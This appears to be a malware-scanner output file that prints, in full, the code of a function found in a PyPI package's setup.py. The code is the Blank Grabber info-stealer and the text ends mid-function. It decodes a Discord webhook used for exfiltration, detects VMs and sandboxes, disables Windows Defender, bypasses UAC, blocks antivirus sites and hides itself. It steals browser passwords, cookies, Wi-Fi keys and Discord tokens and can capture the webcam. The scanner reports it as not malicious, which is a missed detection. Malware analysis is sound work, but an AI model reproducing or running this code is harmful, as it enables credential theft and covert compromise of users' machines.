statistics:
  total_files: 1
  skipped_files: 0.0
  processed_objects: 1
  malicious_objects: 0
details:
- path: .repo_cache/malicious_repos/pypi_malregistry/ef3233434refefeffe/1.0/ef3233434refefeffe-1.0/ef3233434refefeffe-1.0/setup.py
  contents:
  - name: rcd
    score: 0.0
    code: |-
      def rcd():
          import os
          import sys
          import base64
          import subprocess

          subprocess.check_call([sys.executable, "-m", "pip",
                                "install", "urllib3", "pyaes"])
          import json
          import pyaes
          import random
          import shutil
          import sqlite3
          import re
          import traceback
          import time
          import ctypes
          import logging
          import zlib
          from threading import Thread
          from ctypes import wintypes
          from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warnings_urllib3
          disable_warnings_urllib3()

          class Settings:
              C2 = (0, base64.b64decode('aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExODk0Mjc0Mjk2MDE3MTAxMDAvSm1MdnAtWHpqeUd6dVlGck5makJWV1prUDZhNDJMZV96TkdNRWE4cDVXX1ZWekhoNFZzRVVmb21kOG1GNDhnMWhMNEI=').decode())
              Mutex = base64.b64decode('bnRtVFdTaEQzWTNiVUFKcA==').decode()
              PingMe = bool('true')
              Vmprotect = bool('')
              Startup = bool('')
              Melt = bool('')
              UacBypass = bool('')
              ArchivePassword = base64.b64decode('ZGcx').decode()
              HideConsole = bool('')
              Debug = bool('true')
              RunBoundOnStartup = bool('')
              CaptureWebcam = bool('true')
              CapturePasswords = bool('true')
              CaptureCookies = bool('true')
              CaptureAutofills = bool('true')
              CaptureHistory = bool('true')
              CaptureDiscordTokens = bool('true')
              CaptureGames = bool('true')
              CaptureWifiPasswords = bool('true')
              CaptureSystemInfo = bool('true')
              CaptureScreenshot = bool('true')
              CaptureTelegram = bool('true')
              CaptureCommonFiles = bool('true')
              CaptureWallets = bool('true')
              FakeError = (bool(''), ('', '', '0'))
              BlockAvSites = bool('true')
              DiscordInjection = bool('true')

          if not hasattr(sys, '_MEIPASS'):
              sys._MEIPASS = os.path.dirname(os.path.abspath(__file__))
          ctypes.windll.kernel32.SetConsoleMode(
              ctypes.windll.kernel32.GetStdHandle(-11), 7)
          logging.basicConfig(
              format='\x1b[1;36m%(funcName)s\x1b[0m:\x1b[1;33m%(levelname)7s\x1b[0m:%(message)s')
          for _, logger in logging.root.manager.loggerDict.items():
              logger.disabled = True
          Logger = logging.getLogger('Blank Grabber')
          Logger.setLevel(logging.INFO)
          if not Settings.Debug:
              Logger.disabled = True

          class VmProtect:
              BLACKLISTED_UUIDS = ('7AB5C494-39F5-4941-9163-47F54D6D5016', '032E02B4-0499-05C3-0806-3C0700080009', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE',
                                   'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FE822042-A70C-D08B-F1D1-C207055A488F', '76122042-C286-FA81-F0A8-514CC507B250', '481E2042-A1AF-D390-CE06-A8F783B1E76A', 'F3988356-32F5-4AE1-8D47-FD3B8BAFBD4C', '9961A120-E691-4FFE-B67B-F0E4115D5919')
              BLACKLISTED_COMPUTERNAMES = ('bee7370c-8c0c-4', 'desktop-nakffmt', 'win-5e07cos9alr', 'b30f0242-1c6a-4', 'desktop-vrsqlag', 'q9iatrkprh', 'xc64zb', 'desktop-d019gdm', 'desktop-wi8clet', 'server1', 'lisa-pc', 'john-pc', 'desktop-b0t93d6', 'desktop-1pykp29',
                                           'desktop-1y2433r', 'wileypc', 'work', '6c4e733f-c2d9-4', 'ralphs-pc', 'desktop-wg3myjs', 'desktop-7xc6gez', 'desktop-5ov9s0o', 'qarzhrdbpj', 'oreleepc', 'archibaldpc', 'julia-pc', 'd1bnjkfvlh', 'compname_5076', 'desktop-vkeons4', 'NTT-EFF-2W11WSS')
              BLACKLISTED_USERS = ('wdagutilityaccount', 'abby', 'peter wilson', 'hmarc', 'patex', 'john-pc', 'rdhj0cnfevzx', 'keecfmwgj', 'frank', '8nl0colnq5bq', 'lisa', 'john',
                                   'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a', 'lmvwjj9b', 'pqonjhvwexss', '3u2v9m8', 'julia', 'heuerzl', 'harry johnson', 'j.seance', 'a.monaldo', 'tvm')
              BLACKLISTED_TASKS = ('fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp',
                                   'x96dbg', 'vmsrvc', 'x32dbg', 'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver', 'vmwareservice', 'vmwaretray', 'discordtokenprotector')

              @staticmethod
              def checkUUID() -> bool:
                  Logger.info('Checking UUID')
                  uuid = subprocess.run('wmic csproduct get uuid', shell=True, capture_output=True).stdout.splitlines()[
                      2].decode(errors='ignore').strip()
                  return uuid in VmProtect.BLACKLISTED_UUIDS

              @staticmethod
              def checkComputerName() -> bool:
                  Logger.info('Checking computer name')
                  computername = os.getenv('computername')
                  return computername.lower() in VmProtect.BLACKLISTED_COMPUTERNAMES

              @staticmethod
              def checkUsers() -> bool:
                  Logger.info('Checking username')
                  user = os.getlogin()
                  return user.lower() in VmProtect.BLACKLISTED_USERS

              @staticmethod
              def checkHosting() -> bool:
                  Logger.info('Checking if system is hosted online')
                  http = PoolManager(cert_reqs='CERT_NONE')
                  try:
                      return http.request('GET', 'http://ip-api.com/line/?fields=hosting').data.decode(errors='ignore').strip() == 'true'
                  except Exception:
                      Logger.info('Unable to check if system is hosted online')
                      return False

              @staticmethod
              def checkHTTPSimulation() -> bool:
                  Logger.info('Checking if system is simulating connection')
                  http = PoolManager(cert_reqs='CERT_NONE', timeout=1.0)
                  try:
                      http.request(
                          'GET', f'https://blank-{Utility.GetRandomString()}.in')
                  except Exception:
                      return False
                  else:
                      return True

              @staticmethod
              def checkRegistry() -> bool:
                  Logger.info('Checking registry')
                  r1 = subprocess.run(
                      'REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2', capture_output=True, shell=True)
                  r2 = subprocess.run(
                      'REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2', capture_output=True, shell=True)
                  gpucheck = any((x.lower() in subprocess.run('wmic path win32_VideoController get name', capture_output=True,
                                                              shell=True).stdout.decode(errors='ignore').splitlines()[2].strip().lower() for x in ('virtualbox', 'vmware')))
                  dircheck = any([os.path.isdir(path)
                                  for path in ('D:\\Tools', 'D:\\OS2', 'D:\\NT3X')])
                  return r1.returncode != 1 and r2.returncode != 1 or gpucheck or dircheck

              @staticmethod
              def killTasks() -> None:
                  Utility.TaskKill(*VmProtect.BLACKLISTED_TASKS)

              @staticmethod
              def isVM() -> bool:
                  Logger.info('Checking if system is a VM')
                  Thread(target=VmProtect.killTasks, daemon=True).start()
                  result = VmProtect.checkHTTPSimulation() or VmProtect.checkUUID() or VmProtect.checkComputerName(
                  ) or VmProtect.checkUsers() or VmProtect.checkHosting() or VmProtect.checkRegistry()
                  if result:
                      Logger.info('System is a VM')
                  else:
                      Logger.info('System is not a VM')
                  return result

          class Errors:
              errors: list[str] = []

              @staticmethod
              def Catch(func):

                  def newFunc(*args, **kwargs):
                      try:
                          return func(*args, **kwargs)
                      except Exception as e:
                          if isinstance(e, KeyboardInterrupt):
                              os._exit(1)
                          if not isinstance(e, UnicodeEncodeError):
                              trb = traceback.format_exc()
                              Errors.errors.append(trb)
                              if Utility.GetSelf()[1]:
                                  Logger.error(trb)
                  return newFunc

          class Tasks:
              threads: list[Thread] = list()

              @staticmethod
              def AddTask(task: Thread) -> None:
                  Tasks.threads.append(task)

              @staticmethod
              def WaitForAll() -> None:
                  for thread in Tasks.threads:
                      thread.join()

          class Syscalls:

              @staticmethod
              def CaptureWebcam(index: int, filePath: str) -> bool:
                  avicap32 = ctypes.windll.avicap32
                  WS_CHILD = 1073741824
                  WM_CAP_DRIVER_CONNECT = 1024 + 10
                  WM_CAP_DRIVER_DISCONNECT = 1026
                  WM_CAP_FILE_SAVEDIB = 1024 + 100 + 25
                  hcam = avicap32.capCreateCaptureWindowW(wintypes.LPWSTR(
                      'Blank'), WS_CHILD, 0, 0, 0, 0, ctypes.windll.user32.GetDesktopWindow(), 0)
                  result = False
                  if hcam:
                      if ctypes.windll.user32.SendMessageA(hcam, WM_CAP_DRIVER_CONNECT, index, 0):
                          if ctypes.windll.user32.SendMessageA(hcam, WM_CAP_FILE_SAVEDIB, 0, wintypes.LPWSTR(filePath)):
                              result = True
                          ctypes.windll.user32.SendMessageA(
                              hcam, WM_CAP_DRIVER_DISCONNECT, 0, 0)
                      ctypes.windll.user32.DestroyWindow(hcam)
                  return result

              @staticmethod
              def CreateMutex(mutex: str) -> bool:
                  kernel32 = ctypes.windll.kernel32
                  mutex = kernel32.CreateMutexA(None, False, mutex)
                  return kernel32.GetLastError() != 183

              @staticmethod
              def CryptUnprotectData(encrypted_data: bytes, optional_entropy: str = None) -> bytes:

                  class DATA_BLOB(ctypes.Structure):
                      _fields_ = [('cbData', ctypes.c_ulong),
                                  ('pbData', ctypes.POINTER(ctypes.c_ubyte))]
                  pDataIn = DATA_BLOB(len(encrypted_data), ctypes.cast(
                      encrypted_data, ctypes.POINTER(ctypes.c_ubyte)))
                  pDataOut = DATA_BLOB()
                  pOptionalEntropy = None
                  if optional_entropy is not None:
                      optional_entropy = optional_entropy.encode('utf-16')
                      pOptionalEntropy = DATA_BLOB(len(optional_entropy), ctypes.cast(
                          optional_entropy, ctypes.POINTER(ctypes.c_ubyte)))
                  if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, ctypes.byref(pOptionalEntropy) if pOptionalEntropy is not None else None, None, None, 0, ctypes.byref(pDataOut)):
                      data = (ctypes.c_ubyte * pDataOut.cbData)()
                      ctypes.memmove(data, pDataOut.pbData, pDataOut.cbData)
                      ctypes.windll.Kernel32.LocalFree(pDataOut.pbData)
                      return bytes(data)
                  raise ValueError('Invalid encrypted_data provided!')

              @staticmethod
              def HideConsole() -> None:
                  ctypes.windll.user32.ShowWindow(
                      ctypes.windll.kernel32.GetConsoleWindow(), 0)

          class Utility:

              @staticmethod
              def GetSelf() -> tuple[str, bool]:
                  if hasattr(sys, 'frozen'):
                      return (sys.executable, True)
                  else:
                      return (__file__, False)

              @staticmethod
              def TaskKill(*tasks: str) -> None:
                  tasks = list(map(lambda x: x.lower(), tasks))
                  out = subprocess.run('tasklist /FO LIST', shell=True,
                                       capture_output=True).stdout.decode(errors='ignore').strip().split('\r\n\r\n')
                  for i in out:
                      i = i.split('\r\n')[:2]
                      try:
                          name, pid = (i[0].split()[-1], int(i[1].split()[-1]))
                          name = name[:-4] if name.endswith('.exe') else name
                          if name.lower() in tasks:
                              subprocess.run('taskkill /F /PID %d' %
                                             pid, shell=True, capture_output=True)
                      except Exception:
                          pass

              @staticmethod
              def UACPrompt(path: str) -> bool:
                  return ctypes.windll.shell32.ShellExecuteW(None, 'runas', path, ' '.join(sys.argv), None, 1) == 42

              @staticmethod
              def DisableDefender() -> None:
                  command = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDIgJiAiJVByb2dyYW1GaWxlcyVcV2luZG93cyBEZWZlbmRlclxNcENtZFJ1bi5leGUiIC1SZW1vdmVEZWZpbml0aW9ucyAtQWxs').decode(errors='ignore')
                  subprocess.Popen(
                      command, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

              @staticmethod
              def ExcludeFromDefender(path: str = None) -> None:
                  if path is None:
                      path = Utility.GetSelf()[0]
                  subprocess.Popen("powershell -Command Add-MpPreference -ExclusionPath '{}'".format(
                      path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

              @staticmethod
              def GetRandomString(length: int = 5, invisible: bool = False):
                  if invisible:
                      return ''.join(random.choices(['\xa0', chr(8239)] + [chr(x) for x in range(8192, 8208)], k=length))
                  else:
                      return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=length))

              @staticmethod
              def GetWifiPasswords() -> dict:
                  profiles = list()
                  passwords = dict()
                  for line in subprocess.run('netsh wlan show profile', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().splitlines():
                      if 'All User Profile' in line:
                          name = line[line.find(':') + 1:].strip()
                          profiles.append(name)
                  for profile in profiles:
                      found = False
                      for line in subprocess.run(f'netsh wlan show profile "{profile}" key=clear', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().splitlines():
                          if 'Key Content' in line:
                              passwords[profile] = line[line.find(':') + 1:].strip()
                              found = True
                              break
                      if not found:
                          passwords[profile] = '(None)'
                  return passwords

              @staticmethod
              def GetLnkTarget(path_to_lnk: str) -> str | None:
                  target = None
                  if os.path.isfile(path_to_lnk):
                      output = subprocess.run('wmic path win32_shortcutfile where name="%s" get target /value' % os.path.abspath(
                          path_to_lnk).replace('\\', '\\\\'), shell=True, capture_output=True).stdout.decode()
                      if output:
                          for line in output.splitlines():
                              if line.startswith('Target='):
                                  temp = line.lstrip('Target=').strip()
                                  if os.path.exists(temp):
                                      target = temp
                                      break
                  return target

              @staticmethod
              def GetLnkFromStartMenu(app: str) -> list[str]:
                  shortcutPaths = []
                  startMenuPaths = [os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs'), os.path.join(
                      'C:\\', 'ProgramData', 'Microsoft', 'Windows', 'Start Menu', 'Programs')]
                  for startMenuPath in startMenuPaths:
                      for root, _, files in os.walk(startMenuPath):
                          for file in files:
                              if file.lower() == '%s.lnk' % app.lower():
                                  shortcutPaths.append(os.path.join(root, file))
                  return shortcutPaths

              @staticmethod
              def IsAdmin() -> bool:
                  return ctypes.windll.shell32.IsUserAnAdmin() == 1

              @staticmethod
              def UACbypass(method: int = 1) -> bool:
                  if Utility.GetSelf()[1]:
                      def execute(cmd): return subprocess.run(
                          cmd, shell=True, capture_output=True)
                      match method:
                          case 1:
                              execute(
                                  f'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{sys.executable}" /f')
                              execute(
                                  'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v "DelegateExecute" /f')
                              log_count_before = len(execute(
                                  'wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                              execute('computerdefaults --nouacbypass')
                              log_count_after = len(execute(
                                  'wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                              execute(
                                  'reg delete hkcu\\Software\\Classes\\ms-settings /f')
                              if log_count_after > log_count_before:
                                  return Utility.UACbypass(method + 1)
                          case 2:
                              execute(
                                  f'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{sys.executable}" /f')
                              execute(
                                  'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v "DelegateExecute" /f')
                              log_count_before = len(execute(
                                  'wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                              execute('fodhelper --nouacbypass')
                              log_count_after = len(execute(
                                  'wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                              execute(
                                  'reg delete hkcu\\Software\\Classes\\ms-settings /f')
                              if log_count_after > log_count_before:
                                  return Utility.UACbypass(method + 1)
                          case _:
                              return False
                      return True

              @staticmethod
              def IsInStartup() -> bool:
                  path = os.path.dirname(Utility.GetSelf()[0])
                  return os.path.basename(path).lower() == 'startup'

              @staticmethod
              def PutInStartup() -> str:
                  STARTUPDIR = 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp'
                  file, isExecutable = Utility.GetSelf()
                  if isExecutable:
                      out = os.path.join(STARTUPDIR, '{}.scr'.format(
                          Utility.GetRandomString(invisible=True)))
                      os.makedirs(STARTUPDIR, exist_ok=True)
                      try:
                          shutil.copy(file, out)
                      except Exception:
                          return None
                      return out

              @staticmethod
              def IsConnectedToInternet() -> bool:
                  http = PoolManager(cert_reqs='CERT_NONE')
                  try:
                      return http.request('GET', 'https://gstatic.com/generate_204').status == 204
                  except Exception:
                      return False

              @staticmethod
              def DeleteSelf():
                  path, isExecutable = Utility.GetSelf()
                  if isExecutable:
                      subprocess.Popen('ping localhost -n 3 > NUL && del /A H /F "{}"'.format(path),
                                       shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
                      os._exit(0)
                  else:
                      os.remove(path)

              @staticmethod
              def HideSelf() -> None:
                  path, _ = Utility.GetSelf()
                  subprocess.Popen('attrib +h +s "{}"'.format(path), shell=True,
                                   creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

              @staticmethod
              def BlockSites() -> None:
                  if Utility.IsAdmin():
                      call = subprocess.run(
                          'REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /V DataBasePath', shell=True, capture_output=True)
                      if call.returncode != 0:
                          hostdirpath = os.path.join('System32', 'drivers', 'etc')
                      else:
                          hostdirpath = os.sep.join(call.stdout.decode(
                              errors='ignore').strip().splitlines()[-1].split()[-1].split(os.sep)[1:])
                      hostfilepath = os.path.join(
                          os.getenv('systemroot'), hostdirpath, 'hosts')
                      if not os.path.isfile(hostfilepath):
                          return
                      with open(hostfilepath) as file:
                          data = file.readlines()
                      BANNED_SITES = ('virustotal.com', 'avast.com', 'totalav.com', 'scanguard.com', 'totaladblock.com', 'pcprotect.com', 'mcafee.com', 'bitdefender.com', 'us.norton.com', 'avg.com', 'malwarebytes.com', 'pandasecurity.com', 'avira.com', 'norton.com',
                                      'eset.com', 'zillya.com', 'kaspersky.com', 'usa.kaspersky.com', 'sophos.com', 'home.sophos.com', 'adaware.com', 'bullguard.com', 'clamav.net', 'drweb.com', 'emsisoft.com', 'f-secure.com', 'zonealarm.com', 'trendmicro.com', 'ccleaner.com')
                      newdata = []
                      for i in data:
                          if any([x in i for x in BANNED_SITES]):
                              continue
                          else:
                              newdata.append(i)
                      for i in BANNED_SITES:
                          newdata.append('\t0.0.0.0 {}'.format(i))
                          newdata.append('\t0.0.0.0 www.{}'.format(i))
                      newdata = '\n'.join(newdata).replace('\n\n', '\n')
                      subprocess.run('attrib -r {}'.format(hostfilepath),
                                     shell=True, capture_output=True)
                      with open(hostfilepath, 'w') as file:
                          file.write(newdata)
                      subprocess.run('attrib +r {}'.format(hostfilepath),
                                     shell=True, capture_output=True)

          class Browsers:

              class Chromium:
                  BrowserPath: str = None
                  EncryptionKey: bytes = None

                  def __init__(self, browserPath: str) -> None:
                      if not os.path.isdir(browserPath):
                          raise NotADirectoryError('Browser path not found!')
                      self.BrowserPath = browserPath

                  def GetEncryptionKey(self) -> bytes | None:
                      if self.EncryptionKey is not None:
                          return self.EncryptionKey
                      else:
                          localStatePath = os.path.join(
                              self.BrowserPath, 'Local State')
                          if os.path.isfile(localStatePath):
                              with open(localStatePath, encoding='utf-8', errors='ignore') as file:
                                  jsonContent: dict = json.load(file)
                              encryptedKey: str = jsonContent['os_crypt']['encrypted_key']
                              encryptedKey = base64.b64decode(
                                  encryptedKey.encode())[5:]
                              self.EncryptionKey = Syscalls.CryptUnprotectData(
                                  encryptedKey)
                              return self.EncryptionKey
                          else:
                              return None

                  def Decrypt(self, buffer: bytes, key: bytes) -> str:
                      version = buffer.decode(errors='ignore')
                      if version.startswith(('v10', 'v11')):
                          iv = buffer[3:15]
                          cipherText = buffer[15:]
                          return pyaes.AESModeOfOperationGCM(key, iv).decrypt(cipherText)[:-16].decode(errors='ignore')
                      else:
                          return str(Syscalls.CryptUnprotectData(buffer))

                  def GetPasswords(self) -> list[tuple[str, str, str]]:
                      encryptionKey = self.GetEncryptionKey()
                      passwords = list()
                      if encryptionKey is None:
                          return passwords
                      loginFilePaths = list()
                      for root, _, files in os.walk(self.BrowserPath):
                          for file in files:
                              if file.lower() == 'login data':
                                  filepath = os.path.join(root, file)
                                  loginFilePaths.append(filepath)
                      for path in loginFilePaths:
                          while True:
                              tempfile = os.path.join(
                                  os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                              if not os.path.isfile(tempfile):
                                  break
                          try:
                              shutil.copy(path, tempfile)
                          except Exception:
                              continue
                          db = sqlite3.connect(tempfile)
                          db.text_factory = lambda b: b.decode(errors='ignore')
                          cursor = db.cursor()
                          try:
                              results = cursor.execute(
                                  'SELECT origin_url, username_value, password_value FROM logins').fetchall()
                              for url, username, password in results:
                                  password = self.Decrypt(password, encryptionKey)
                                  if url and username and password:
                                      passwords.append((url, username, password))
                          except Exception:
                              pass
                          cursor.close()
                          db.close()
                          os.remove(tempfile)
                      return passwords

                  def GetCookies(self) -> list[tuple[str, str, str, str, int]]:
                      encryptionKey = self.GetEncryptionKey()
                      cookies = list()
                      if encryptionKey is None:
                          return cookies
                      cookiesFilePaths = list()
                      for root, _, files in os.walk(self.BrowserPath):
                          for file in files:
                              if file.lower() == 'cookies':
                                  filepath = os.path.join(root, file)
                                  cookiesFilePaths.append(filepath)
                      for path in cookiesFilePaths:
                          while True:
                              tempfile = os.path.join(
                                  os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                              if not os.path.isfile(tempfile):
                                  break
                          try:
                              shutil.copy(path, tempfile)
                          except Exception:
                              continue
                          db = sqlite3.connect(tempfile)
                          db.text_factory = lambda b: b.decode(errors='ignore')
                          cursor = db.cursor()
                          try:
                              results = cursor.execute(
                                  'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies').fetchall()
                              for host, name, path, cookie, expiry in results:
                                  cookie = self.Decrypt(cookie, encryptionKey)
                                  if host and name and cookie:
                                      cookies.append(
                                          (host, name, path, cookie, expiry))
                          except Exception:
                              pass
                          cursor.close()
                          db.close()
                          os.remove(tempfile)
                      return cookies

                  def GetHistory(self) -> list[tuple[str, str, int]]:
                      history = list()
                      historyFilePaths = list()
                      for root, _, files in os.walk(self.BrowserPath):
                          for file in files:
                              if file.lower() == 'history':
                                  filepath = os.path.join(root, file)
                                  historyFilePaths.append(filepath)
                      for path in historyFilePaths:
                          while True:
                              tempfile = os.path.join(
                                  os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                              if not os.path.isfile(tempfile):
                                  break
                          try:
                              shutil.copy(path, tempfile)
                          except Exception:
                              continue
                          db = sqlite3.connect(tempfile)
                          db.text_factory = lambda b: b.decode(errors='ignore')
                          cursor = db.cursor()
                          try:
                              results = cursor.execute(
                                  'SELECT url, title, visit_count, last_visit_time FROM urls').fetchall()
                              for url, title, vc, lvt in results:
                                  if url and title and (vc is not None) and (lvt is not None):
                                      history.append((url, title, vc, lvt))
                          except Exception:
                              pass
                          cursor.close()
                          db.close()
                          os.remove(tempfile)
                      history.sort(key=lambda x: x[3], reverse=True)
                      return list([(x[0], x[1], x[2]) for x in history])

                  def GetAutofills(self) -> list[str]:
                      autofills = list()
                      autofillsFilePaths = list()
                      for root, _, files in os.walk(self.BrowserPath):
                          for file in files:
                              if file.lower() == 'web data':
                                  filepath = os.path.join(root, file)
                                  autofillsFilePaths.append(filepath)
                      for path in autofillsFilePaths:
                          while True:
                              tempfile = os.path.join(
                                  os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                              if not os.path.isfile(tempfile):
                                  break
                          try:
                              shutil.copy(path, tempfile)
                          except Exception:
                              continue
                          db = sqlite3.connect(tempfile)
                          db.text_factory = lambda b: b.decode(errors='ignore')
                          cursor = db.cursor()
                          try:
                              results: list[str] = [x[0] for x in cursor.execute(
                                  'SELECT value FROM autofill').fetchall()]
                              for data in results:
                                  data = data.strip()
                                  if data and (not data in autofills):
                                      autofills.append(data)
                          except Exception:
                              pass
                          cursor.close()
                          db.close()
                          os.remove(tempfile)
                      return autofills

          class Discord:
              httpClient = PoolManager(cert_reqs='CERT_NONE')
              ROAMING = os.getenv('appdata')
              LOCALAPPDATA = os.getenv('localappdata')
              REGEX = '[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{25,110}'
              REGEX_ENC = 'dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\"]*'

              @staticmethod
              def GetHeaders(token: str = None) -> dict:
                  headers = {'content-type': 'application/json',
                             'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4593.122 Safari/537.36'}
                  if token:
                      headers['authorization'] = token
                  return headers

              @staticmethod
              def GetTokens() -> list[dict]:
                  results: list[dict] = list()
                  tokens: list[str] = list()
                  threads: list[Thread] = list()
                  paths = {'Discord': os.path.join(Discord.ROAMING, 'discord'), 'Discord Canary': os.path.join(Discord.ROAMING, 'discordcanary'), 'Lightcord': os.path.join(Discord.ROAMING, 'Lightcord'), 'Discord PTB': os.path.join(Discord.ROAMING, 'discordptb'), 'Opera': os.path.join(Discord.ROAMING, 'Opera Software', 'Opera Stable'), 'Opera GX': os.path.join(Discord.ROAMING, 'Opera Software', 'Opera GX Stable'), 'Amigo': os.path.join(Discord.LOCALAPPDATA, 'Amigo', 'User Data'), 'Torch': os.path.join(Discord.LOCALAPPDATA, 'Torch', 'User Data'), 'Kometa': os.path.join(Discord.LOCALAPPDATA, 'Kometa', 'User Data'), 'Orbitum': os.path.join(Discord.LOCALAPPDATA, 'Orbitum', 'User Data'), 'CentBrowse': os.path.join(Discord.LOCALAPPDATA, 'CentBrowser', 'User Data'), '7Sta': os.path.join(Discord.LOCALAPPDATA, '7Star', '7Star', 'User Data'), 'Sputnik': os.path.join(
                      Discord.LOCALAPPDATA, 'Sputnik', 'Sputnik', 'User Data'), 'Vivaldi': os.path.join(Discord.LOCALAPPDATA, 'Vivaldi', 'User Data'), 'Chrome SxS': os.path.join(Discord.LOCALAPPDATA, 'Google', 'Chrome SxS', 'User Data'), 'Chrome': os.path.join(Discord.LOCALAPPDATA, 'Google', 'Chrome', 'User Data'), 'FireFox': os.path.join(Discord.ROAMING, 'Mozilla', 'Firefox', 'Profiles'), 'Epic Privacy Browse': os.path.join(Discord.LOCALAPPDATA, 'Epic Privacy Browser', 'User Data'), 'Microsoft Edge': os.path.join(Discord.LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data'), 'Uran': os.path.join(Discord.LOCALAPPDATA, 'uCozMedia', 'Uran', 'User Data'), 'Yandex': os.path.join(Discord.LOCALAPPDATA, 'Yandex', 'YandexBrowser', 'User Data'), 'Brave': os.path.join(Discord.LOCALAPPDATA, 'BraveSoftware', 'Brave-Browser', 'User Data'), 'Iridium': os.path.join(Discord.LOCALAPPDATA, 'Iridium', 'User Data')}
                  for name, path in paths.items():
                      if os.path.isdir(path):
                          if name == 'FireFox':
                              t = Thread(target=lambda: tokens.extend(
                                  Discord.FireFoxSteal(path) or list()))
                              t.start()
                              threads.append(t)
                          else:
                              t = Thread(target=lambda: tokens.extend(
                                  Discord.SafeStorageSteal(path) or list()))
                              t.start()
                              threads.append(t)
                              t = Thread(target=lambda: tokens.extend(
                                  Discord.SimpleSteal(path) or list()))
                              t.start()
                              threads.append(t)
                  for thread in threads:
                      thread.join()
                  tokens = [*set(tokens)]
                  for token in tokens:
                      r: HTTPResponse = Discord.httpClient.request(
                          'GET', 'https://discord.com/api/v9/users/@me', headers=Discord.GetHeaders(token.strip()))
                      if r.status == 200:
